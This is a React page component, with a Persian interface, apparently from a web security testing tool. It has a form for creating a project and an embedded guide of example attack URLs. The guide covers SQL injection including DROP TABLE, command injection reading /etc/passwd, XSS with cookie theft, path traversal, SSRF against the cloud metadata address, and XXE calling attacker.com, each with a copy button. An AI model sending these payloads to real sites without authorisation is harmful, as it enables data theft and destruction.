import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useMutation } from '@tanstack/react-query'
import { useForm } from 'react-hook-form'
import { zodResolver } from '@hookform/resolvers/zod'
import { z } from 'zod'
import { apiService } from '../services/api'
import { ArrowRight, Globe, Info, Loader2, ChevronDown, ChevronUp } from 'lucide-react'
import toast from 'react-hot-toast'

const projectSchema = z.object({
  name: z.string().min(3, 'نام باید حداقل ۳ کاراکتر باشد').max(100),
  domain: z.string()
    .min(1, 'دامنه الزامی است')
    .regex(
      /^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/,
      'فرمت دامنه صحیح نیست (مثال: example.com)'
    ),
  description: z.string().max(500).optional(),
})

// داده‌های راهنمای تست امنیتی
const securityTestingGuide = [
  {
    category: "تزریق (Injection)",
    vulnerabilities: [
      {
        name: "SQL Injection",
        description: "تزریق دستورات SQL به پایگاه داده",
        examples: [
          "users?id=1' OR '1'='1",
          "search?q=test'; DROP TABLE users--",
          "product?id=2 UNION SELECT 1,2,3--"
        ],
        parameters: ["id", "q", "search", "category", "user"]
      },
      {
        name: "Command Injection",
        description: "تزریق دستورات سیستم عامل",
        examples: [
          "ping?ip=127.0.0.1; whoami",
          "download?file=test.txt | cat /etc/passwd",
          "exec?command=ls -la"
        ],
        parameters: ["ip", "file", "command", "exec", "cmd"]
      }
    ]
  },
  {
    category: "احراز هویت و مدیریت نشست",
    vulnerabilities: [
      {
        name: "Broken Authentication",
        description: "مشکلات در سیستم احراز هویت",
        examples: [
          "login?username=admin&password=admin",
          "reset-password?token=123456",
          "session?id=insecure_session_token"
        ],
        parameters: ["username", "password", "token", "session", "auth"]
      }
    ]
  },
  {
    category: "XSS (Cross-Site Scripting)",
    vulnerabilities: [
      {
        name: "Reflected XSS",
        description: "XSS بازتابی در پارامترهای URL",
        examples: [
          "search?q=<script>alert('XSS')</script>",
          "error?message=<img src=x onerror=alert(1)>",
          "redirect?url=javascript:alert('XSS')"
        ],
        parameters: ["q", "search", "message", "error", "url", "redirect"]
      },
      {
        name: "Stored XSS",
        description: "XSS ذخیره شده در پایگاه داده",
        examples: [
          "comment?text=<script>stealCookies()</script>",
          "profile?name=<svg onload=alert(1)>"
        ],
        parameters: ["text", "comment", "name", "content", "body"]
      }
    ]
  },
  {
    category: "دسترسی‌های غیرمجاز",
    vulnerabilities: [
      {
        name: "IDOR",
        description: "دسترسی به منابع دیگر کاربران",
        examples: [
          "users/123/profile",
          "orders/456/invoice",
          "files/789/download"
        ],
        parameters: ["id", "user_id", "order_id", "file_id"]
      },
      {
        name: "Path Traversal",
        description: "دسترسی به فایل‌های خارج از مسیر مجاز",
        examples: [
          "download?file=../../../etc/passwd",
          "view?page=../../config/database.php",
          "load?template=../../../../windows/system32/drivers/etc/hosts"
        ],
        parameters: ["file", "page", "template", "load", "path"]
      }
    ]
  },
  {
    category: "مشکلات سمت سرور",
    vulnerabilities: [
      {
        name: "SSRF",
        description: "جعل درخواست از سمت سرور",
        examples: [
          "fetch?url=http://localhost:22",
          "proxy?target=file:///etc/passwd",
          "api?endpoint=http://169.254.169.254/latest/meta-data/"
        ],
        parameters: ["url", "target", "endpoint", "proxy", "fetch"]
      },
      {
        name: "XXE",
        description: "تزریق موجودیت XML",
        examples: [
          "upload?xml=<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
          "api?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com'>]>"
        ],
        parameters: ["xml", "data", "content"]
      }
    ]
  }
]

export default function NewProjectPage() {
  const navigate = useNavigate()
  const [showGuide, setShowGuide] = useState(false)
  const [expandedCategories, setExpandedCategories] = useState({})
  
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch
  } = useForm({
    resolver: zodResolver(projectSchema),
    defaultValues: {
      name: '',
      domain: '',
      description: ''
    }
  })
  
  const domain = watch('domain')
  
  const createMutation = useMutation({
    mutationFn: (data) => apiService.createProject(data),
    onSuccess: (response) => {
      toast.success('پروژه با موفقیت ایجاد شد')
      navigate(`/projects/${response.data.id}`)
    },
    onError: (error) => {
      toast.error(error.response?.data?.detail || 'خطا در ایجاد پروژه')
    }
  })
  
  const onSubmit = (data) => {
    createMutation.mutate(data)
  }
  
  const toggleCategory = (categoryIndex) => {
    setExpandedCategories(prev => ({
      ...prev,
      [categoryIndex]: !prev[categoryIndex]
    }))
  }

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text)
    toast.success('متن کپی شد')
  }
  
  return (
    <div className="max-w-4xl mx-auto">
      <button
        onClick={() => navigate('/projects')}
        className="flex items-center gap-2 text-gray-600 hover:text-gray-900 mb-6"
      >
        <ArrowRight className="w-5 h-5" />
        بازگشت به پروژه‌ها
      </button>
      
      <div className="card">
        <div className="flex items-center gap-3 mb-6">
          <div className="w-12 h-12 rounded-xl bg-primary-100 flex items-center justify-center">
            <Globe className="w-6 h-6 text-primary-600" />
          </div>
          <div>
            <h1 className="text-xl font-bold text-gray-900">پروژه جدید</h1>
            <p className="text-gray-500">اطلاعات وب‌سایت مورد نظر را وارد کنید</p>
          </div>
        </div>
        
        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              نام پروژه
            </label>
            <input
              type="text"
              {...register('name')}
              placeholder="مثال: وب‌سایت شرکت"
              className={`input ${errors.name ? 'input-error' : ''}`}
            />
            {errors.name && (
              <p className="mt-1 text-sm text-red-500">{errors.name.message}</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              دامنه
            </label>
            <div className="relative">
              <input
                type="text"
                {...register('domain')}
                placeholder="example.com"
                className={`input pl-24 ${errors.domain ? 'input-error' : ''}`}
                dir="ltr"
              />
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm">
                //:https
              </span>
            </div>
            {errors.domain && (
              <p className="mt-1 text-sm text-red-500">{errors.domain.message}</p>
            )}
            {domain && !errors.domain && (
              <p className="mt-1 text-sm text-gray-500">
                آدرس کامل: https://{domain}
              </p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              توضیحات (اختیاری)
            </label>
            <textarea
              {...register('description')}
              rows={3}
              placeholder="توضیحات درباره پروژه..."
              className={`input ${errors.description ? 'input-error' : ''}`}
            />
            {errors.description && (
              <p className="mt-1 text-sm text-red-500">{errors.description.message}</p>
            )}
          </div>
          
          {/* بخش راهنمای تست امنیتی */}
          <div className="border rounded-lg overflow-hidden">
            <button
              type="button"
              onClick={() => setShowGuide(!showGuide)}
              className="w-full flex items-center justify-between p-4 bg-blue-50 hover:bg-blue-100 transition-colors"
            >
              <div className="flex items-center gap-3">
                <Info className="w-5 h-5 text-blue-600" />
                <div className="text-right">
                  <h3 className="font-medium text-blue-900">راهنمای تست امنیتی - نمونه URL و پارامترها</h3>
                  <p className="text-sm text-blue-700">نمونه‌هایی برای تست انواع آسیب‌پذیری‌های رایج</p>
                </div>
              </div>
              {showGuide ? <ChevronUp className="w-5 h-5 text-blue-600" /> : <ChevronDown className="w-5 h-5 text-blue-600" />}
            </button>
            
            {showGuide && (
              <div className="p-4 bg-white max-h-96 overflow-y-auto">
                <div className="space-y-4">
                  {securityTestingGuide.map((category, categoryIndex) => (
                    <div key={categoryIndex} className="border rounded-lg">
                      <button
                        type="button"
                        onClick={() => toggleCategory(categoryIndex)}
                        className="w-full flex items-center justify-between p-3 bg-gray-50 hover:bg-gray-100"
                      >
                        <span className="font-medium text-gray-900">{category.category}</span>
                        {expandedCategories[categoryIndex] ? 
                          <ChevronUp className="w-4 h-4" /> : 
                          <ChevronDown className="w-4 h-4" />
                        }
                      </button>
                      
                      {expandedCategories[categoryIndex] && (
                        <div className="p-4 space-y-4">
                          {category.vulnerabilities.map((vuln, vulnIndex) => (
                            <div key={vulnIndex} className="border-b pb-4 last:border-b-0 last:pb-0">
                              <div className="mb-3">
                                <h4 className="font-medium text-gray-900 mb-1">{vuln.name}</h4>
                                <p className="text-sm text-gray-600">{vuln.description}</p>
                              </div>
                              
                              <div className="mb-3">
                                <h5 className="text-sm font-medium text-gray-700 mb-2">پارامترهای رایج:</h5>
                                <div className="flex flex-wrap gap-2">
                                  {vuln.parameters.map((param, paramIndex) => (
                                    <span
                                      key={paramIndex}
                                      className="px-2 py-1 bg-blue-100 text-blue-800 text-xs rounded-md"
                                    >
                                      {param}
                                    </span>
                                  ))}
                                </div>
                              </div>
                              
                              <div>
                                <h5 className="text-sm font-medium text-gray-700 mb-2">نمونه URL:</h5>
                                <div className="space-y-2">
                                  {vuln.examples.map((example, exampleIndex) => (
                                    <div
                                      key={exampleIndex}
                                      className="flex items-center gap-2 group cursor-pointer"
                                      onClick={() => copyToClipboard(example)}
                                    >
                                      <code className="flex-1 text-xs bg-gray-100 p-2 rounded text-gray-800 font-mono text-left dir-ltr overflow-x-auto">
                                        {domain ? `https://${domain}/` : 'https://example.com/'}{example}
                                      </code>
                                      <button
                                        type="button"
                                        className="opacity-0 group-hover:opacity-100 transition-opacity px-2 py-1 text-xs bg-gray-200 hover:bg-gray-300 rounded"
                                      >
                                        کپی
                                      </button>
                                    </div>
                                  ))}
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
          
          <div className="flex items-center gap-3">
            <button
              type="submit"
              disabled={createMutation.isPending}
              className="btn-primary flex-1"
            >
              {createMutation.isPending ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  در حال ایجاد...
                </>
              ) : (
                'ایجاد پروژه'
              )}
            </button>
            <button
              type="button"
              onClick={() => navigate('/projects')}
              className="btn-secondary"
            >
              انصراف
            </button>
          </div>
        </form>
      </div>
    </div>
  )
}